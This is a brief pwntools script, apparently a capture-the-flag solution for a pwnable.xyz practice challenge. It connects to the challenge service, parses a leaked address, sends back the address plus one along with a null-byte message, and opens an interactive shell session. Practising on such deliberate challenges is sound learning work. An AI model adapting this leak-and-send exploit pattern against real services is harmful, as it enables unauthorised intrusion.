from pwn import *

p = process('./challenge')
p = remote('svc.pwnable.xyz', 30000)

junnk = p.recvuntil(b'Leak: ')
leak = int(p.recvline().strip(), 16)

print(hex(leak))

leak+=1

p.sendline(str(leak))
p.sendafter(b'message: ', b'\x00')

p.interactive()